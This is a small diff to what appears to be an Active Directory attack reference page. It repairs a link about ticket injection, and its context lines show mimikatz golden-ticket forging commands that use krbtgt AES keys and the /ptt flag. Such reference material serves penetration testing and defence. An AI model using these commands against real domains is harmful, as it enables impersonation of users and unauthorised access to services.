@@ -46,7 +46,7 @@ kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /use
 kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 ```
 
-For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../../../../ad/movement/kerberos/forged-tickets/broken-reference/).
+For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).
 {% endtab %}
 {% endtabs %}
 
